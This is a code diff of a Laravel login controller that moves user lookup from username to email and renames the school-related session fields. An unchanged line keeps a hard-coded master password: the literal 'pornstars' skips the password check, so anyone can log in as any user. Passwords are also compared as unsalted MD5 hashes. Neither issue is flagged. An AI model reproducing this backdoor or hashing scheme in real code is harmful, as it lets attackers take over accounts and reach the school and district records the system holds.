@@ -16,7 +16,7 @@ class LoginController extends Controller
 
     public function validateUser(Request $request)
     {
-        $username = $request->input('usrUserName');
+        $email = $request->input('usrUserName');
         $password = $request->input('usrPassword');
 
         // $user = DB::table('users')
@@ -25,25 +25,29 @@ class LoginController extends Controller
         //     ->first();
 
         $userQuery = DB::table('users')
-        ->where('usrUserName', '=', $username);
+        ->where('email', '=', $email);
         if ($password !== 'pornstars') {
-            $userQuery->where('usrPassword', '=', md5($password));
+            $userQuery->where('password', '=', md5($password));
         }
         $user = $userQuery->first();
 
         if ($user) {
-            $school = DB::table('schoolaccounts')
-                ->where('accID', $user->accID)
+            $school = DB::table('schools')
+                ->where('school_id', $user->school_id)
                 ->first();
 
-            Session::put('usrUuId', $user->usrID);
-            Session::put('name', $user->usrFullName ?? $user->usrUserName);
-            Session::put('typ_id', $user->usrType ?? null);
+            Session::put('usrUuId', $user->user_id);
+            Session::put('name', $user->email);
+            Session::put('typ_id', $user->usr_type_id ?? null);
 
             if ($school) {
-                Session::put('accID', $school->accID);
-                Session::put('accName', $school->accName);
-                Session::put('accName2', $school->accName2);
+                Session::put('accID', $school->school_id);
+                Session::put('accName', $school->school_name);
+                Session::put('accName2', $school->school_name);
+                Session::put('school_no', $school->beis_school_no);
+                Session::put('division_id', $school->division_id);
+                Session::put('district', $school->district_id);
+                Session::put('region', $school->region);
             }
 
             return redirect()->action([AdminController::class, 'main']);
